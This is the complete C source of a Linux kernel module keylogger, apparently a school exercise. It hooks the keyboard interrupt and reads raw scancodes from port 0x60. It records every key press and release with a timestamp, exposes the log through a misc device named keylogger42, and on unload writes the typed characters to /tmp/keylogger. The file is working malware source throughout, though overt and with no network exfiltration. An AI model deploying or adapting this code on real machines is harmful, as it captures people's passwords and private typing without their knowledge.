#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/interrupt.h>
#include <linux/list.h>
#include <linux/slab.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/time.h>
#include <linux/seq_file.h>

#define COUNT_OF(x) (sizeof(x) / sizeof(*x))

#define IS_PRESSED(x) (!x)
#define IS_RELEASED(x) (x)
#define IS_VALID(x) (x < keytable_len ? keytable[x].name : "!UNKNOWN!")
#define IS_PRINT_CMD(x) (x == 0x1C || x == 0x0F || x == 0x39)
#define IS_SHIFT(x) (x == 0x36 || x == 0x2A)

struct stroke_s {
	unsigned char key;
	unsigned char state;
	const char *name;
	char value;
	struct tm time;
	struct list_head list;
};

struct keycode_s {
	char ascii;
	const char *name;
	char command;
};

static void irq_keylogger(unsigned long data);

static LIST_HEAD(strokehead);

/*
 * This variable is used as an identifier for shared interrupt lines.
 * Since many drivers can be loaded on the same line, free_irq needs
 * to know what driver it should free.
 */

static const void *line_id = "keylogger42";

/*
 * An ISR blocks any other interrupt, so the goal is to leave the interrupt
 * handler as fast as we can. To do that I use a tasklet, which schedule a
 * function to be executed later, when the kernel has some time.
 */

DECLARE_TASKLET(tasklet_s, irq_keylogger, 0);

DEFINE_RWLOCK(log_lock);
DEFINE_RWLOCK(misc_lock);


const struct keycode_s keytable[] = {
	{0x0, "Empty", -1}, {0x1, "ESC", 1}, {'1', "1", 0}, {'2', "2", 0},
	{'3', "3", 0}, {'4', "4", 0}, {'5', "5", 0}, {'6', "6", 0},
	{'7', "7", 0}, {'8', "8", 0}, {'9', "9", 0}, {'0', "0", 0},
	{'-', "-", 0}, {'=', "=", 0}, {0xE, "BACKSPACE", 1}, {'\t', "TAB", 1},
	{'q', "q", 0}, {'w', "w", 0}, {'e', "e", 0}, {'r', "r", 0},
	{'t', "t", 0}, {'y', "y", 0}, {'u', "u", 0}, {'i', "i", 0},
	{'o', "o", 0}, {'p', "p", 0}, {'[', "[", 0}, {']', "]", 0},
	{'\n', "ENTER", 1}, {0x1D, "CONTROL", 1}, {'a', "a", 0}, {'s', "s", 0},
	{'d', "d", 0}, {'f', "f", 0}, {'g', "g", 0}, {'h', "h", 0},
	{'j', "j", 0}, {'k', "k", 0}, {'l', "l", 0}, {';', ";", 0},
	{'\'', "\'", 0}, {'`', "`", 0}, {0x2A, "LEFT SHIFT", 1},
	{'\\', "\\", 0}, {'z', "z", 0}, {'x', "x", 0}, {'c', "c", 0},
	{'v', "v", 0}, {'b', "b", 0}, {'n', "n", 0}, {'m', "m", 0},
	{',', ",", 0}, {'.', ".", 0}, {'/', "/", 0}, {0x36, "RIGHT SHIFT", 1},
	{0x37, "PRINT", 1}, {0x38, "ALT", 1}, {' ', "SPACE", 1},
	{0x3A, "CAPSLOCK", 1}, {0x3B, "F1", 1}, {0x3C, "F2", 1},
	{0x3D, "F3", 1}, {0x3E, "F4", 1}, {0x3F, "F5", 1}, {0x40, "F6", 1},
	{0x41, "F7", 1}, {0x42, "F8", 1}, {0x43, "F9", 1}, {0x44, "F10", 1},
	{0x45, "NUMLOCK", 1}, {0x46, "SCREENLOCK", 1}, {0x47, "HOME", 1},
	{0x48, "ARROW UP", 1}, {0x49, "PAGE UP", 1}, {'-', "(NUM) MINUS", 1},
	{0x4B, "ARROW LEFT", 1}, {'5', "(NUM) 5", 1}, {0x4D, "ARROW RIGHT", 1},
	{'+', "(NUM) PLUS", 1}, {0x4F, "END", 1}, {0x50, "ARROW DOWN", 1},
	{0x51, "PAGE DOWN", 1}, {0x52, "INSERT", 1}, {0x53, "DELETE", 1},
	{0x0, NULL, 0}
};

const struct keycode_s keytable_shift[] = {
	{0x0, "Empty", -1}, {0x1, "ESC", 1}, {'!', "!", 0}, {'@', "@", 0},
	{'#', "#", 0}, {'$', "$", 0}, {'%', "%", 0}, {'^', "^", 0},
	{'&', "&", 0}, {'*', "*", 0}, {'(', "(", 0}, {')', ")", 0},
	{'_', "_", 0}, {'+', "+", 0}, {0xE, "BACKSPACE", 1}, {'\t', "TAB", 1},
	{'Q', "Q", 0}, {'W', "W", 0}, {'E', "E", 0}, {'R', "R", 0},
	{'T', "T", 0}, {'Y', "Y", 0}, {'U', "U", 0}, {'I', "I", 0},
	{'O', "O", 0}, {'P', "P", 0}, {'{', "{", 0}, {'}', "}", 0},
	{'\n', "ENTER", 1}, {0x1D, "CONTROL", 1}, {'A', "A", 0}, {'S', "S", 0},
	{'D', "D", 0}, {'F', "F", 0}, {'G', "G", 0}, {'H', "H", 0},
	{'J', "J", 0}, {'K', "K", 0}, {'L', "L", 0}, {':', ":", 0},
	{'\"', "\"", 0}, {'~', "~", 0}, {0x2A, "LEFT SHIFT", 1},
	{'\\', "\\", 0}, {'Z', "Z", 0}, {'X', "X", 0}, {'C', "C", 0},
	{'V', "V", 0}, {'B', "B", 0}, {'N', "N", 0}, {'M', "M", 0},
	{'<', "<", 0}, {'>', ">", 0}, {'?', "?", 0}, {0x36, "RIGHT SHIFT", 1},
	{0x37, "PRINT", 1}, {0x38, "ALT", 1}, {' ', "SPACE", 1},
	{0x3A, "CAPSLOCK", 1}, {0x3B, "F1", 1}, {0x3C, "F2", 1},
	{0x3D, "F3", 1}, {0x3E, "F4", 1}, {0x3F, "F5", 1}, {0x40, "F6", 1},
	{0x41, "F7", 1}, {0x42, "F8", 1}, {0x43, "F9", 1}, {0x44, "F10", 1},
	{0x45, "NUMLOCK", 1}, {0x46, "SCREENLOCK", 1}, {0x47, "HOME", 1},
	{0x48, "ARROW UP", 1}, {0x49, "PAGE UP", 1}, {'-', "(NUM) -", 1},
	{0x4B, "ARROW LEFT", 1}, {'5', "(NUM) 5", 1}, {0x4D, "ARROW RIGHT", 1},
	{'+', "(NUM) +", 1}, {0x4F, "END", 1}, {0x50, "ARROW DOWN", 1},
	{0x51, "PAGE DOWN", 1}, {0x52, "INSERT", 1}, {0x53, "DELETE", 1},
	{0x0, NULL, 0}
};

static const unsigned int keytable_len = COUNT_OF(keytable);

static int keylogger_show(struct seq_file *seq, void *v)
{
	const struct stroke_s *cur;
	static const char *state_str[] = {
		"RELEASED", "PRESSED"
	};

	read_lock(&misc_lock);
	list_for_each_entry(cur, &strokehead, list) {
		seq_printf(seq, "%02d:%02d:%02d   %-13s (%#.2x) %s\n",
				cur->time.tm_hour,
				cur->time.tm_min,
				cur->time.tm_sec,
				cur->name,
				cur->key,
				state_str[IS_PRESSED(cur->state)]);
	}
	read_unlock(&misc_lock);
	return 0;
}

static int my_open(struct inode *inode, struct file *file)
{
	/*
	 * Seq open does not use private_data, and will throw an WARN_ON
	 * if not set to null.
	 */
	file->private_data = NULL;
	return single_open(file, keylogger_show, NULL);
}

static int my_release(struct inode *inode, struct file *file)
{
	return single_release(inode, file);
}

static void get_time(struct tm *time)
{
	struct timeval tv;

	do_gettimeofday(&tv);

	/*
	 * time_to_tm converts calendar time to tm struct.
	 * totalsecs is calibrated on UTC, so we add 1 hour to get GMT+1.
	 */
	time_to_tm(tv.tv_sec, 3600, time);
}

static void irq_keylogger(unsigned long data)
{
	int scancode;
	int state;
	struct stroke_s *stroke;

	static int shift_toggle;

	scancode = inb(0x60);
	state = (scancode & 0x80) >> 0x7;
	scancode &= 0x7F;

	if (IS_SHIFT(scancode)) {
		shift_toggle = state;
		return ;
	}
	stroke = kmalloc(sizeof(struct stroke_s), GFP_ATOMIC);
	if (!stroke)
		return;
	stroke->state = state;
	stroke->key = scancode;
	get_time(&stroke->time);
	stroke->name = IS_VALID(stroke->key);
	list_add_tail(&stroke->list, &strokehead);
}

static irqreturn_t irq_handler(int irq, void *dev_id)
{
	tasklet_schedule(&tasklet_s);
	return IRQ_HANDLED;
}

static void free_list(void)
{
	const struct stroke_s *cur;
	const struct stroke_s *tmp;

	list_for_each_entry_safe(cur, tmp, &strokehead, list) {
		kfree(cur);
	}
}

static const struct file_operations misc_fops = {
	.owner = THIS_MODULE,
	.open = my_open,
	.read = seq_read,
	.release = my_release
};

static struct miscdevice misc_s = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "keylogger42",
	.fops = &misc_fops
};

static ssize_t file_write(struct file *file, const void *buf, size_t n)
{
	ssize_t ret = 0;
	loff_t offset = 0;

	read_lock(&log_lock);
	ret = kernel_write(file, buf, n, &offset);
	read_unlock(&log_lock);
	return ret;
}

static ssize_t write_tmp(void)
{
	struct stroke_s *cur = NULL;
	char buf[1024] = {0};
	int i = 0;
	ssize_t ret = 0;
	struct file *file;
	mm_segment_t oldfs;

	oldfs = get_fs();
	set_fs(get_ds());
	file = filp_open("/tmp/keylogger", O_CREAT | O_WRONLY | O_APPEND, 0444);
	if (IS_ERR(file))
		return -ENOENT;
	list_for_each_entry(cur, &strokehead, list) {
		if (i == sizeof(buf) - 1) {
			ret = file_write(file, buf, i);
			if (ret < 0)
				goto out;
			i = 0;
		}
		if (!cur->state && (!keytable[cur->key].command
					|| IS_PRINT_CMD(cur->key)))
			buf[i++] = keytable[cur->key].ascii;
	}
	ret = file_write(file, buf, i);
out:
	set_fs(oldfs);
	filp_close(file, NULL);
	return ret;
}

static int __init init_keyboard(void)
{
	int ret;

	ret = request_irq(1,
			irq_handler,
			IRQF_SHARED,
			"keylogger42",
			(void *)line_id);
	if (ret)
		return ret;
	pr_info("LOADED -- 42 keylogger module.\n");
	return misc_register(&misc_s);
}

static void __exit exit_keyboard(void)
{
	free_irq(1, (void *)line_id);
	tasklet_kill(&tasklet_s);
	if (write_tmp() < 0)
		pr_warn("WARNING! Something went wrong writing log file.\n");
	free_list();
	pr_info("UNLOADED -- 42 keylogger module.\n");
	misc_deregister(&misc_s);
}

module_init(init_keyboard);
module_exit(exit_keyboard);

MODULE_LICENSE("Dual MIT/GPL");
MODULE_AUTHOR("agouby");
MODULE_DESCRIPTION("Keyboard driver, keylogger");
